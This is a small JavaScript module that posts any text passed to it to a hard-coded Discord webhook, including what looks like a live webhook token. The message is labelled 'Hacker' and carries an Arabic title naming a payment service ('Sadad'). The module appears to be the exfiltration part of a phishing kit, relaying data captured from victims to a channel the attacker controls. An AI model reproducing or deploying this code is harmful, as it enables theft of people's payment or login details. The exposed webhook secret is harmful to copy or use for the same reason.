import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321596480175214723/gQc2KDr5lgJdg-RY-FzXpfkOLVROfcmp5jedDmI-OJVAUSkc_upNktF0HkS7KWeZihHc",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
